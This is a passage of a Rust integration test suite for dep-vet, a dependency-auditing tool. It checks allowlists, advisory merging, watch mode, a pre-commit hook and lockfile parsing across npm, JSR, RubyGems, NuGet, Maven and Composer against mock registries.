    );
    repo.write(
        ".depvet.toml",
        "[[allow]]\npackage = \"evil-pkg\"\nfinding = \"install-scripts\"\nreason = \"native build, reviewed\"\n",
    );

    let evil = PackageFixture {
        scripts: r#"{"postinstall":"node-gyp rebuild"}"#,
        ..PackageFixture::clean("evil-pkg")
    };
    let registry = registry_with(&[evil], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("[ALLOWED]"))
        .stdout(predicate::str::contains("native build, reviewed"));
}

#[test]
fn unknown_allowlist_finding_is_a_tool_error() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join(".depvet.toml"),
        "[[allow]]\npackage = \"x\"\nfinding = \"vibes\"\nreason = \"why\"\n",
    )
    .unwrap();

    binary()
        .current_dir(directory.path())
        .args(["npm", "express"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("is not a finding dep-vet emits"));
}

#[test]
fn explicit_config_path_wins_over_discovery() {
    let work = tempfile::tempdir().unwrap();
    std::fs::write(
        work.path().join(".depvet.toml"),
        "[[allow]]\npackage = \"nothing\"\nreason = \"unused\"\n",
    )
    .unwrap();
    let config = work.path().join("explicit.toml");
    std::fs::write(
        &config,
        "[[allow]]\npackage = \"crossenv\"\nreason = \"explicit review\"\n",
    )
    .unwrap();

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    registry
        .command()
        .current_dir(work.path())
        .args(["npm", "crossenv", "--config"])
        .arg(&config)
        .assert()
        .code(0)
        .stdout(predicate::str::contains("explicit review"));
}

#[test]
fn advisories_listed_under_several_ids_are_merged() {
    let package = PackageFixture::clean("dup-adv-pkg");
    let mut routes = HashMap::new();
    routes.insert(package.route(), (200, package.to_json()));
    routes.insert(
        "/v1/querybatch".to_string(),
        (
            200,
            r#"{"results":[{"vulns":[{"id":"GHSA-dup-1"},{"id":"PYSEC-dup-1"}]}]}"#.to_string(),
        ),
    );
    routes.insert(
        "/v1/vulns/GHSA-dup-1".to_string(),
        (
            200,
            r#"{"id":"GHSA-dup-1","summary":"one problem","aliases":["CVE-2026-1","PYSEC-dup-1"],"database_specific":{"severity":"HIGH"}}"#.to_string(),
        ),
    );
    routes.insert(
        "/v1/vulns/PYSEC-dup-1".to_string(),
        (
            200,
            r#"{"id":"PYSEC-dup-1","summary":"one problem","aliases":["CVE-2026-1","GHSA-dup-1"],"database_specific":{"severity":"MODERATE"}}"#.to_string(),
        ),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["npm", "dup-adv-pkg", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["advisories"].as_array().unwrap().len(), 1);
    assert_eq!(value["advisories"][0]["id"], "GHSA-dup-1");
    assert_eq!(value["advisories"][0]["severity"], "high");
    assert_eq!(value["findings"].as_array().unwrap().len(), 1);
}

const JSR_META: &str = r#"{
    "scope": "std",
    "name": "assert",
    "latest": "1.0.0",
    "versions": { "1.0.0": { "createdAt": "2026-02-20T07:56:26.774Z" } }
}"#;

const JSR_PACKAGE: &str = r#"{
    "scope": "std",
    "name": "assert",
    "isArchived": false,
    "githubRepository": { "owner": "denoland", "name": "std" }
}"#;

fn jsr_routes(routes: &mut HashMap<String, (u16, String)>) {
    routes.insert(
        "/@std/assert/meta.json".to_string(),
        (200, JSR_META.to_string()),
    );
    routes.insert(
        "/api/scopes/std/packages/assert".to_string(),
        (200, JSR_PACKAGE.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
}

#[test]
fn jsr_package_reports_metadata_and_missing_coverage() {
    let mut routes = HashMap::new();
    jsr_routes(&mut routes);
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["jsr", "@std/assert", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "jsr");
    assert_eq!(value["version"], "1.0.0");
    assert_eq!(value["repository"], "https://github.com/denoland/std");
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in ["execution", "maintainers", "downloads", "advisories"] {
        assert!(
            not_checked.iter().any(|entry| entry == signal),
            "missing {signal}"
        );
    }
    assert_eq!(
        value["findings"][0]["title"],
        "advisory coverage unavailable"
    );
}

#[test]
fn audit_reads_deno_lock_and_audits_jsr_entries() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("deno.lock"),
        r#"{
  "version": "5",
  "jsr": { "@std/assert@1.0.0": { "integrity": "abc" } },
  "npm": { "chalk@5.3.0": { "integrity": "sha512-x" } }
}"#,
    )
    .unwrap();

    let chalk = PackageFixture {
        version: "5.3.0",
        ..PackageFixture::clean("chalk")
    };
    let mut routes = HashMap::new();
    routes.insert(chalk.route(), (200, chalk.to_json()));
    jsr_routes(&mut routes);
    let registry = MockRegistry::start(routes);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "deno.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let names: Vec<&str> = value["packages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|package| package["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["chalk", "@std/assert"]);
    assert!(value["notes"].as_array().is_none(), "no notes expected");
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_reruns_after_the_lockfile_changes() {
    use std::io::{BufRead, BufReader};
    use std::process::Stdio;
    use std::sync::mpsc;
    use std::time::{Duration, Instant};

    let directory = tempfile::tempdir().unwrap();
    let lockfile = directory.path().join("package-lock.json");
    std::fs::write(&lockfile, lockfile_json(&[("clean-pkg", "1.0.0")])).unwrap();

    let registry = registry_with(&[PackageFixture::clean("clean-pkg")], None);
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_dep-vet"))
        .current_dir(directory.path())
        .args(["watch", "package-lock.json"])
        .env("DEPVET_REGISTRY_BASE", &registry.base)
        .env(
            "DEPVET_DOWNLOADS_BASE",
            format!("{}/downloads", registry.base),
        )
        .env("DEPVET_OSV_BASE", &registry.base)
        .env("DEPVET_NO_CACHE", "1")
        .env("NO_COLOR", "1")
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn dep-vet watch");

    let stdout = child.stdout.take().unwrap();
    let (sender, receiver) = mpsc::channel();
    std::thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if sender.send(line).is_err() {
                break;
            }
        }
    });

    fn wait_for(receiver: &mpsc::Receiver<String>, needle: &str) {
        let deadline = Instant::now() + Duration::from_secs(15);
        loop {
            let remaining = deadline.saturating_duration_since(Instant::now());
            match receiver.recv_timeout(remaining) {
                Ok(line) if line.contains(needle) => return,
                Ok(_) => {}
                Err(_) => panic!("timed out waiting for {needle:?}"),
            }
        }
    }

    wait_for(&receiver, "watching");
    wait_for(&receiver, "verdict");
    std::fs::write(
        &lockfile,
        format!("{}\n", lockfile_json(&[("clean-pkg", "1.0.0")])),
    )
    .unwrap();
    wait_for(&receiver, "change detected");
    wait_for(&receiver, "verdict");

    let _ = child.kill();
    let _ = child.wait();
}

#[cfg(unix)]
fn stub_dep_vet(exit_code: i32) -> (tempfile::TempDir, std::path::PathBuf) {
    use std::os::unix::fs::PermissionsExt;
    let directory = tempfile::tempdir().unwrap();
    let log = directory.path().join("calls.log");
    let script = directory.path().join("dep-vet");
    std::fs::write(
        &script,
        format!("#!/bin/sh\necho \"$@\" >> \"$LOG\"\nexit {exit_code}\n"),
    )
    .unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    (directory, log)
}

#[cfg(unix)]
fn run_pre_commit(
    repo: &Repo,
    stub_dir: &std::path::Path,
    log: &std::path::Path,
) -> std::process::Output {
    let path = format!(
        "{}:{}",
        stub_dir.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    std::process::Command::new("sh")
        .arg(format!(
            "{}/.githooks/pre-commit",
            env!("CARGO_MANIFEST_DIR")
        ))
        .current_dir(repo.path())
        .env("PATH", path)
        .env("LOG", log)
        .output()
        .unwrap()
}

#[cfg(unix)]
#[test]
fn pre_commit_runs_only_for_staged_lockfiles() {
    let repo = Repo::new();
    repo.write("README.md", "hi\n");
    repo.commit("base");
    repo.write("README.md", "hello\n");
    repo.git(&["add", "README.md"]);

    let (stub, log) = stub_dep_vet(0);
    let output = run_pre_commit(&repo, stub.path(), &log);
    assert!(output.status.success());
    assert!(!log.exists(), "no lockfile staged, nothing to run");

    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.git(&["add", "package-lock.json"]);
    let output = run_pre_commit(&repo, stub.path(), &log);
    assert!(output.status.success());
    let calls = std::fs::read_to_string(&log).unwrap();
    assert!(calls.contains("audit package-lock.json"), "{calls}");
}

#[cfg(unix)]
#[test]
fn pre_commit_blocks_on_high_risk_and_passes_warnings() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.3.0")]));
    repo.git(&["add", "package-lock.json"]);

    let (blocking, log) = stub_dep_vet(2);
    let output = run_pre_commit(&repo, blocking.path(), &log);
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("blocking"));
    let calls = std::fs::read_to_string(&log).unwrap();
    assert!(
        calls.contains("lock package-lock.json --base HEAD"),
        "{calls}"
    );

    let (warning, log) = stub_dep_vet(1);
    let output = run_pre_commit(&repo, warning.path(), &log);
    assert!(output.status.success(), "warnings must not block a commit");
}

#[test]
fn audit_reads_berry_lock_without_calling_metadata_a_package() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("yarn.lock"),
        r#"__metadata:
  version: 8

"is-number@npm:7.0.0":
  version: 7.0.0
  resolution: "is-number@npm:7.0.0"
"#,
    )
    .unwrap();

    let registry = registry_with(&[js_fixture()], None);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "yarn.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

const GEM_VERSIONS: &str = r#"[
    { "number": "3.2.9", "created_at": "2024-06-01T23:14:58.183Z", "platform": "ruby",
      "metadata": { "source_code_uri": "https://github.com/rack/rack" } },
    { "number": "3.0.0", "created_at": "2024-01-01T00:00:00.000Z", "platform": "ruby" }
]"#;

const GEM_LATEST: &str = r#"{
    "version": "3.2.9",
    "source_code_uri": "https://github.com/rack/rack",
    "yanked": false
}"#;

fn gem_registry(name: &str, versions: &str, latest: &str) -> MockRegistry {
    let mut routes = HashMap::new();
    routes.insert(
        format!("/api/v1/versions/{name}.json"),
        (200, versions.to_string()),
    );
    routes.insert(
        format!("/api/v1/gems/{name}.json"),
        (200, latest.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    MockRegistry::start(routes)
}

#[test]
fn gem_reports_metadata_and_missing_signals() {
    let registry = gem_registry("rack", GEM_VERSIONS, GEM_LATEST);
    let output = registry
        .command()
        .args(["gem", "rack", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "rubygems");
    assert_eq!(value["version"], "3.2.9");
    assert_eq!(value["repository"], "https://github.com/rack/rack");
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in ["execution", "maintainers", "downloads"] {
        assert!(not_checked.iter().any(|entry| entry == signal), "{signal}");
    }
}

#[test]
fn audit_reads_gemfile_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("Gemfile.lock"),
        "GEM\n  remote: https://rubygems.org/\n  specs:\n    rack (3.0.0)\n\nPATH\n  remote: .\n  specs:\n    local (0.1.0)\n",
    )
    .unwrap();

    let registry = gem_registry("rack", GEM_VERSIONS, GEM_LATEST);
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "Gemfile.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "rack");
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

#[test]
fn unknown_gem_is_a_tool_error() {
    let registry = gem_registry("rack", GEM_VERSIONS, GEM_LATEST);
    registry
        .command()
        .args(["gem", "ghost-gem"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on RubyGems"));
}

const NUGET_FLAT: &str = r#"{ "versions": ["12.0.3", "13.0.1", "13.0.4-beta1"] }"#;

const NUGET_REGISTRATION: &str = r#"{
    "items": [ { "items": [
        { "catalogEntry": { "version": "12.0.3", "published": "2020-01-01T00:00:00Z", "listed": true } },
        { "catalogEntry": { "version": "13.0.1", "published": "2024-03-01T00:00:00Z", "listed": true } }
    ] } ]
}"#;

fn nuget_registry(id: &str) -> MockRegistry {
    let mut routes = HashMap::new();
    routes.insert(
        format!("/v3-flatcontainer/{id}/index.json"),
        (200, NUGET_FLAT.to_string()),
    );
    routes.insert(
        format!("/v3/registration5-gz-semver2/{id}/index.json"),
        (200, NUGET_REGISTRATION.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    MockRegistry::start(routes)
}

#[test]
fn nuget_reports_metadata_and_missing_signals() {
    let registry = nuget_registry("newtonsoft.json");
    let output = registry
        .command()
        .args(["nuget", "Newtonsoft.Json", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "nuget");
    assert_eq!(value["version"], "13.0.1");
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in ["execution", "maintainers", "repository", "downloads"] {
        assert!(not_checked.iter().any(|entry| entry == signal), "{signal}");
    }
}

#[test]
fn audit_reads_nuget_packages_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("packages.lock.json"),
        r#"{
            "version": 1,
            "dependencies": {
                "net8.0": {
                    "Newtonsoft.Json": { "type": "Direct", "resolved": "13.0.1" },
                    "My.Project": { "type": "Project" }
                }
            }
        }"#,
    )
    .unwrap();

    let registry = nuget_registry("newtonsoft.json");
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "packages.lock.json", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "Newtonsoft.Json");
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

#[test]
fn unknown_nuget_package_is_a_tool_error() {
    let registry = nuget_registry("newtonsoft.json");
    registry
        .command()
        .args(["nuget", "Ghost.Package"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on NuGet"));
}

#[test]
fn maven_reports_metadata_and_missing_signals() {
    let mut routes = HashMap::new();
    routes.insert(
        "/solrsearch/select?q=g:%22org.slf4j%22+AND+a:%22slf4j-api%22&core=gav&rows=200&wt=json"
            .to_string(),
        (
            200,
            r#"{
                "response": {
                    "docs": [
                        { "v": "2.0.17", "timestamp": 1740501794416 },
                        { "v": "1.7.36", "timestamp": 1635900000000 }
                    ]
                }
            }"#
            .to_string(),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["maven", "org.slf4j:slf4j-api", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "maven");
    assert_eq!(value["version"], "2.0.17");
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in [
        "execution",
        "maintainers",
        "repository",
        "downloads",
        "deprecation",
    ] {
        assert!(not_checked.iter().any(|entry| entry == signal), "{signal}");
    }
}

#[test]
fn maven_exact_version_is_audited() {
    let mut routes = HashMap::new();
    routes.insert(
        "/solrsearch/select?q=g:%22org.slf4j%22+AND+a:%22slf4j-api%22+AND+v:%221.7.36%22&core=gav&rows=200&wt=json"
            .to_string(),
        (
            200,
            r#"{ "response": { "numFound": 1, "docs": [
                { "v": "1.7.36", "timestamp": 1635900000000 }
            ] } }"#
            .to_string(),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["maven", "org.slf4j:slf4j-api@1.7.36", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["version"], "1.7.36");
}

#[test]
fn unknown_maven_artifact_is_a_tool_error() {
    let mut routes = HashMap::new();
    routes.insert(
        "/solrsearch/select?q=g:%22org.slf4j%22+AND+a:%22slf4j-api%22&core=gav&rows=200&wt=json"
            .to_string(),
        (200, r#"{ "response": { "docs": [] } }"#.to_string()),
    );
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .args(["maven", "org.slf4j:slf4j-api"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on Maven Central"));
}

#[test]
fn maven_requires_group_and_artifact() {
    let mut routes = HashMap::new();
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .args(["maven", "slf4j-api"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("group:artifact"));
}

const COMPOSER_P2: &str = r#"{
    "packages": {
        "monolog/monolog": [
            {
                "version": "3.13.0",
                "time": "2024-06-01T10:43:05+00:00",
                "source": { "url": "https://github.com/Seldaek/monolog.git" }
            },
            {
                "version": "3.0.0",
                "time": "2024-01-01T00:00:00+00:00",
                "source": { "url": "https://github.com/Seldaek/monolog.git" }
            }
        ]
    }
}"#;

const COMPOSER_PACKAGE: &str = r#"{
    "package": {
        "name": "monolog/monolog",
        "repository": "https://github.com/Seldaek/monolog",
        "maintainers": [{ "name": "Seldaek" }],
        "abandoned": false
    }
}"#;

fn composer_routes() -> HashMap<String, (u16, String)> {
    let mut routes = HashMap::new();
    routes.insert(
        "/p2/monolog/monolog.json".to_string(),
        (200, COMPOSER_P2.to_string()),
    );
    routes.insert(
        "/packages/monolog/monolog.json".to_string(),
        (200, COMPOSER_PACKAGE.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    routes
}

#[test]
fn composer_reports_maintainers_and_missing_signals() {
    let registry = MockRegistry::start(composer_routes());
    let output = registry
        .command()
        .args(["composer", "Monolog/Monolog", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "composer");
    assert_eq!(value["name"], "monolog/monolog");
    assert_eq!(value["version"], "3.13.0");
    assert_eq!(
        value["repository"],
        "https://github.com/Seldaek/monolog.git"
    );
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in ["execution", "downloads"] {
        assert!(not_checked.iter().any(|entry| entry == signal), "{signal}");
    }
    assert!(
        !not_checked.iter().any(|entry| entry == "maintainers"),
        "maintainers were fetched"
    );
}

#[test]
fn audit_reads_composer_lock() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("composer.lock"),
        r#"{
            "packages": [
                { "name": "monolog/monolog", "version": "3.0.0" }
            ],
            "packages-dev": []
        }"#,
    )
    .unwrap();

    let registry = MockRegistry::start(composer_routes());
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "composer.lock", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "monolog/monolog");
    assert_eq!(value["packages"][0]["version"], "3.0.0");
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

#[test]
fn unknown_composer_package_is_a_tool_error() {
    let registry = MockRegistry::start(composer_routes());
    registry
        .command()
        .args(["composer", "ghost/package"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on Packagist"));
}

#[test]
fn audit_reads_gradle_lockfile() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("gradle.lockfile"),
        "# This is a Gradle generated file for dependency locking.\n\
         org.slf4j:slf4j-api:1.7.36=compileClasspath, runtimeClasspath\n\
         empty=annotationProcessor\n",
    )
    .unwrap();

    let mut routes = HashMap::new();
    routes.insert(
        "/solrsearch/select?q=g:%22org.slf4j%22+AND+a:%22slf4j-api%22+AND+v:%221.7.36%22&core=gav&rows=200&wt=json"
            .to_string(),
        (
            200,
            r#"{ "response": { "numFound": 1, "docs": [
                { "v": "1.7.36", "timestamp": 1635900000000 }
            ] } }"#
            .to_string(),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "gradle.lockfile", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "org.slf4j:slf4j-api");
    assert_eq!(value["packages"][0]["version"], "1.7.36");
    assert_eq!(value["errors"].as_array().unwrap().len(), 0);
}

#[test]
fn audit_reads_legacy_nuget_packages_config() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("packages.config"),
        r#"<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="Newtonsoft.Json" version="13.0.1" targetFramework="net472" />
  <package id="Broken.Without.Version" targetFramework="net472" />
</packages>
"#,
    )
    .unwrap();

    let registry = nuget_registry("newtonsoft.json");
    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "packages.config", "--json"])
        .assert()
        .code(3)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["packages"].as_array().unwrap().len(), 1);
    assert_eq!(value["packages"][0]["name"], "Newtonsoft.Json");
    assert_eq!(value["errors"][0]["package"], "Broken.Without.Version");
}

const GOOGLE_METADATA: &str = r#"<?xml version='1.0' encoding='UTF-8'?>
<metadata>
  <groupId>androidx.core</groupId>
  <artifactId>core-ktx</artifactId>
  <versioning>
    <versions>
      <version>1.12.0</version>
      <version>1.13.1</version>
    </versions>
  </versioning>
</metadata>"#;

#[test]
fn maven_reads_androidx_from_google_maven() {
    let mut routes = HashMap::new();
    routes.insert(
        "/androidx/core/core-ktx/maven-metadata.xml".to_string(),
        (200, GOOGLE_METADATA.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["maven", "androidx.core:core-ktx@1.13.1", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["version"], "1.13.1");
    assert_eq!(
        value["review_url"],
        "https://maven.google.com/web/index.html#androidx.core:core-ktx:1.13.1"
    );
    let not_checked = value["not_checked"].as_array().unwrap();
    for signal in [
        "execution",
        "maintainers",
        "repository",
        "downloads",
        "deprecation",
    ] {
        assert!(not_checked.iter().any(|entry| entry == signal), "{signal}");
    }
    // Google metadata has no publish times.
    assert!(not_checked.iter().any(|entry| entry == "freshness"));
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["title"] == "advisory coverage may be incomplete"),
        "missing Google Maven coverage note: {}",
        value["findings"]
    );
}
